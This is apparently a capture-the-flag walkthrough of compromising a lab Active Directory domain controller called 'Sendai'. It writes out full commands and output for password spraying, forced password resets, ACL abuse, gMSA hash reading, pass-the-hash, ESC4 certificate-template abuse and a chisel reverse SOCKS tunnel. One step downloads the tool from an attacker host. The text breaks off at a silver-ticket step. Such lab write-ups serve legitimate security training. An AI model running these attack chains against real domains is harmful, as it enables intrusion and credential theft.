---
title: "Sendai"
slug: "sendai"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "smb-enumeration"
    label: "SMB Enumeration"
  - id: "password-spraying"
    label: "Password Spraying"
  - id: "acl-abuse-via-admsvc"
    label: "ACL Abuse via admsvc"
  - id: "reading-the-gmsa-password"
    label: "Reading the gMSA Password"
  - id: "user-flag"
    label: "User Flag"
  - id: "helpdesk-service-credentials"
    label: "Helpdesk Service Credentials"
  - id: "privilege-escalation"
    label: "Privilege Escalation"
  - id: "root-flag"
    label: "Root Flag"
  - id: "alternate-path-mssql-to-system"
    label: "Alternate Path: MSSQL to SYSTEM"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

I started with a full-port service scan against the target.

```
$ nmap -p- -sCV -Pn --min-rate=3000 --max-retries=3 -T4 10.129.234.66
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-26 22:45 +0000
Nmap scan report for 10.129.234.66
Host is up (0.021s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-26 22:46:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-26T22:47:16+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
443/tcp   open  ssl/https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-26T22:47:16+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: 2026-10-26T22:47:16+00:00; +1s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2026-10-25T22:42:42
|_Not valid after:  2027-04-26T22:42:42
|_ssl-date: 2026-10-26T22:47:16+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-26T22:46:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
58899/tcp open  msrpc         Microsoft Windows RPC
58921/tcp open  msrpc         Microsoft Windows RPC
64329/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
64330/tcp open  msrpc         Microsoft Windows RPC
64346/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-26T22:46:59
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.01 seconds
```

> **Note:** This is the domain controller for sendai.vl, exposing the usual AD services and an IIS site.

I added the domain and DC to my hosts file.

```
$ echo '10.129.234.66    sendai.vl dc.sendai.vl' | sudo tee -a /etc/hosts
```

## SMB Enumeration

Guest is enabled, it authenticated with a blank password.

```
$ nxc smb dc.sendai.vl -u guest -p '' --users
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:
```

I RID-brute-forced the domain through the guest session.

```
$ nxc smb dc.sendai.vl -u guest -p '' --rid-brute
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:
SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
<SNIP>
```

I filtered that down to a clean list of usernames and saved it to users.txt.

```
$ nxc smb dc.sendai.vl -u guest -p '' --rid-brute | grep SidTypeUser | awk -F '\' '{print $2}' | awk -F ' ' '{print $1}'
Administrator
Guest
krbtgt
DC$
sqlsvc
websvc
Dorothy.Jones
Kerry.Robinson
Naomi.Gardner
Anthony.Smith
Susan.Harper
Stephen.Simpson
Marie.Gallagher
Kathleen.Kelly
Norman.Baxter
Jason.Brady
Elliot.Yates
Malcolm.Smith
Lisa.Williams
Ross.Sullivan
Clifford.Davey
Declan.Jenkins
Lawrence.Grant
Leslie.Johnson
Megan.Edwards
Thomas.Powell
mgtsvc$
```

The guest account can also read a couple of shares.

```
$ nxc smb dc.sendai.vl -u guest -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.66   445    DC               Users           READ
```

I connected to the sendai share to look around.

```
$ impacket-smbclient sendai.vl/guest@dc.sendai.vl -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use sendai
# ls
drw-rw-rw-          0  Tue Jul 18 17:31:04 2023 .
drw-rw-rw-          0  Wed Apr 16 02:55:42 2025 ..
drw-rw-rw-          0  Tue Jul 11 13:26:34 2023 hr
-rw-rw-rw-       1372  Tue Jul 18 17:34:15 2023 incident.txt
drw-rw-rw-          0  Tue Jul 18 13:16:46 2023 it
drw-rw-rw-          0  Tue Jul 11 13:26:34 2023 legal
drw-rw-rw-          0  Tue Jul 18 13:17:35 2023 security
drw-rw-rw-          0  Tue Jul 11 13:26:34 2023 transfer
```

It had multiple directories so I mounted it locally to browse it more easily.

```
$ mkdir sendai && sudo mount -t cifs //dc.sendai.vl/sendai ./sendai/ -o 'username=guest,password='
```

A recursive listing showed some text files, department folders, IT tools, and a per-user transfer dir.

```
$ tree sendai
sendai
├── hr
├── incident.txt
├── it
│   ├── Bginfo64.exe
│   └── PsExec64.exe
├── legal
├── security
│   └── guidelines.txt
└── transfer
    ├── anthony.smith
    ├── clifford.davey
    ├── elliot.yates
    ├── lisa.williams
    ├── susan.harper
    ├── temp
    └── thomas.powell
```

incident.txt explained that weak-password accounts were expired and must be reset.

```
$ cat sendai/incident.txt
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.
```

> **Note:** Expiring an account doesn't delete its password — it just sets the "must change at next logon" flag. For accounts that still have a blank or weak password, I can authenticate far enough to be told `STATUS_PASSWORD_MUST_CHANGE` and then set a new password myself without knowing the old one. That makes the user list worth spraying.

## Password Spraying

I sprayed the user list with a blank password to find the expired accounts.

```
$ nxc smb dc.sendai.vl -u users.txt -p '' --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest:
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE
```

> **Note:** elliot.yates and thomas.powell return `STATUS_PASSWORD_MUST_CHANGE` rather than a plain failure and their blank passwords are still valid, just expired. I can reset them to a password of my choice.

I set a new password for elliot.yates with the nxc change-password module.

```
$ nxc smb dc.sendai.vl -u elliot.yates -p '' -M change-password -o NEWPASS='Password123!'
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for elliot.yates
```

## ACL Abuse via admsvc

With valid creds I collected BloodHound data as elliot.yates.

```
$ bloodhound-ce-python -u elliot.yates -p 'Password123!' -d sendai.vl -ns 10.129.234.66 --zip -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sendai.vl
<SNIP>
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 27 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sendai.vl
INFO: Done in 00M 13S
INFO: Compressing output into 20261026234109_bloodhound.zip
```

elliot.yates is a member of the support group, and support holds GenericAll over the admsvc objects.

[![BloodHound: elliot.yates is a member of support, which has GenericAll over the admsvc OU and group](/images/walkthroughs/sendai/elliot-support-genericall-admsvc.png)](/images/walkthroughs/sendai/elliot-support-genericall-admsvc.png)

The admsvc group can read the gMSA password of mgtsvc$.

[![BloodHound: the admsvc group has ReadGMSAPassword over the mgtsvc$ account](/images/walkthroughs/sendai/admsvc-readgmsa-mgtsvc.png)](/images/walkthroughs/sendai/admsvc-readgmsa-mgtsvc.png)

> **Note:** GenericAll over the admsvc group lets me add myself to it, and admsvc members are allowed to read mgtsvc$'s managed password. So the plan is: add elliot.yates to admsvc, read the gMSA password, then log in as mgtsvc$.

I added elliot.yates to the admsvc group with bloodyAD.

```
$ bloodyad -u elliot.yates -p 'Password123!' -d sendai.vl -H dc.sendai.vl add groupMember admsvc elliot.yates
[+] elliot.yates added to admsvc
```

## Reading the gMSA Password

As an admsvc member, I dumped the mgtsvc$ gMSA password with netexec.

```
$ nxc ldap dc.sendai.vl -u elliot.yates -p 'Password123!' --gmsa
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)
LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:Password123!
LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: 88d544b552c4763c0333db7e48708a0d     PrincipalsAllowedToReadPassword: admsvc
```

> **Note:** A gMSA password rotates automatically and is never set by a human, but any principal listed in `PrincipalsAllowedToReadPassword` can read the current blob and derive its NT hash. With that hash I don't need the cleartext — I can pass-the-hash directly.

## User Flag

With the hash I logged into WinRM as mgtsvc$ by pass-the-hash.

```
$ evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H 88d544b552c4763c0333db7e48708a0d

<SNIP>

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> cd c:\
*Evil-WinRM* PS C:\> cat user.txt
fff3************************cd3e
```

## Helpdesk Service Credentials

As mgtsvc$ I checked the running processes for anything unusual.

```
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    119       8     5136      10848              3996   0 AggregatorHost
    400      36    12720      22588              2552   0 certsrv
<SNIP>
    198      12    12296      12640              3096   0 helpdesk
<SNIP>
```

> **Note:** Two processes stand out. `certsrv` means AD CS is installed here and `helpdesk` is a non-standard service, worth checking.

A registry search for the helpdesk service revealed credentials on its ImagePath.

```
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f helpdesk

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\HelpdeskLog

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\HelpdeskLog\HelpdeskLog

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\HelpdeskLog\HelpdeskSource

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Support
    ImagePath    REG_EXPAND_SZ    C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs

End of search: 4 match(es) found.
```

> **Note:** The service's `ImagePath` runs `helpdesk.exe` as clifford.davey with its password on the command line, leaking credentials: `clifford.davey:RFmoB2WplgE_3p`.

BloodHound shows clifford.davey is a member of ca-operators.

[![BloodHound: clifford.davey is a member of ca-operators, staff and domain users](/images/walkthroughs/sendai/clifford-ca-operators.png)](/images/walkthroughs/sendai/clifford-ca-operators.png)

## Privilege Escalation

With clifford.davey's creds I searched for vulnerable certificate templates.

```
$ certipy-ad find -stdout -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-host dc.sendai.vl
Certipy v5.1.0 - by Oliver Lyak (ly4k)

<SNIP>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\ca-operators
                                          SENDAI.VL\Domain Computers
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

> **Note:** ESC4 means I have write access over the template's security descriptor through membership in ca-operators. I can't enroll against it as-is, but I can rewrite the template into a vulnerable configuration, request a certificate as any user, and then restore it.

I overwrote the template with the default (permissive) configuration.

```
$ certipy-ad template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'SendaiComputer.json'
[*] Wrote current configuration for 'SendaiComputer' to 'SendaiComputer.json'
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9cD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

Then I requested a certificate impersonating Administrator on that template.

```
$ certipy-ad req -u clifford.davey@dc.sendai.vl -p 'RFmoB2WplgE_3p' -target 10.129.234.66 -ca sendai-DC-CA -template SendaiComputer -upn Administrator -sid S-1-5-21-3085872742-570972823-736764132-500
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC.SENDAI.VL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Authenticating with the certificate dumped Administrator's NT hash.

```
$ certipy-ad auth -pfx administrator.pfx -domain sendai.vl -username administrator -dc-ip 10.129.234.66
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

## Root Flag

With the NT hash I logged into WinRM as Administrator and read the flag.

```
$ evil-winrm -i dc.sendai.vl -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a

<SNIP>

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\desktop\root.txt
1bc1************************91cf
```

## Alternate Path: MSSQL to SYSTEM

There's a second route from the mgtsvc$ shell to SYSTEM that never touches AD CS — it pivots through the SQL Server running locally on the DC.

From the mgtsvc$ shell, a config file at C:\config leaked sqlsvc's password.

```
*Evil-WinRM* PS C:\> ls config


    Directory: C:\config


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/11/2023   5:57 AM             78 .sqlconfig


*Evil-WinRM* PS C:\> cat config/.sqlconfig
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```

netstat shows that SQL Server is listening on 0.0.0.0:1433.

```
*Evil-WinRM* PS C:\> netstat -ano | findstr 1433
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       5956
  TCP    [::]:1433              [::]:0                 LISTENING       5956
```

Explicit scan on port 1433 shows it's in filtered state, it means that firewall is blocking the inbound traffic on that port.

```
$ nmap dc.sendai.vl -p 1433 -sCV -Pn
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-27 20:22 +0000
Nmap scan report for dc.sendai.vl (10.129.234.66)
Host is up.
rDNS record for 10.129.234.66: sendai.vl

PORT     STATE    SERVICE  VERSION
1433/tcp filtered ms-sql-s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

I uploaded chisel to the DC.

```
*Evil-WinRM* PS C:\> cd c:\windows\temp
*Evil-WinRM* PS C:\windows\temp> iwr http://10.10.14.56:8000/chisel-windows-amd64.exe -o .\chisel.exe
```

I started the chisel server in reverse SOCKS mode.

```
$ ./chisel-linux-amd64 server -p 9000 --reverse --socks5
2026/10/27 20:32:43 server: Reverse tunnelling enabled
2026/10/27 20:32:43 server: Fingerprint hdAOZ67inr/FNxEpTS53xinq6xLc/O+5+hh0ipxvfk4=
2026/10/27 20:32:43 server: Listening on http://0.0.0.0:9000
```

Then ran the client on the DC to connect to my server.

```
*Evil-WinRM* PS C:\windows\temp> start-process -filepath .\chisel -argumentList "client 10.10.14.56:9000 R:socks" -windowstyle hidden
```

The tunnel connected, opening a SOCKS proxy on 127.0.0.1:1080.

```
2026/10/27 20:33:24 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Through the tunnel I logged into MSSQL as sqlsvc, but the login maps to the low-privileged guest user.

```
$ proxychains -q impacket-mssqlclient sendai.vl/sqlsvc:SurenessBlob85@127.0.0.1 -windows-auth
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SENDAI\sqlsvc  guest@master)> SELECT USER_NAME();

-----
guest
```

msdb carries the TRUSTWORTHY flag, but there were no accounts I could impersonate.

```
SQL (SENDAI\sqlsvc  guest@master)> enum_db
name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1
SQL (SENDAI\sqlsvc  guest@master)> use msdb;
ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'msdb'.
SQL (SENDAI\sqlsvc  guest@msdb)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
```

As the guest-mapped login I could neither run nor enable xp_cmdshell.

```
SQL (SENDAI\sqlsvc  guest@msdb)> xp_cmdshell whoami
ERROR(DC\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (SENDAI\sqlsvc  guest@msdb)> enable_xp_cmdshell
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Escalation paths via MSSQL were closed but since I have credentials for service account I derived the NT hash of the sqlsvc password offline to forge a Silver Ticket.

```
$ pypykatz crypto nt SurenessBlob85
58655c0b90b2492f84fb46fa78c2d96a
```

Then I forged a silver ticket for the MSSQL SPN with the Domain Admins SID as an extra SID.

```
